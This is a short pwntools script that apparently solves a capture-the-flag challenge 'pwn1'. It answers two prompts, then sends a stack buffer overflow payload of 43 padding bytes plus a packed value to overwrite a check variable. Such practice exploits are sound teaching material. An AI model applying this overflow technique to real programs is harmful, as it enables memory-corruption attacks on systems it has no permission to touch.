from pwn import *

p = process('./pwn1')

p.sendline(b"Sir Lancelot of Camelot")
p.sendline(b"To seek the Holy Grail.")

goal = 0xdea110c8

payload = b"A"*43
payload += p64(goal)

p.sendline(payload)

p.interactive()
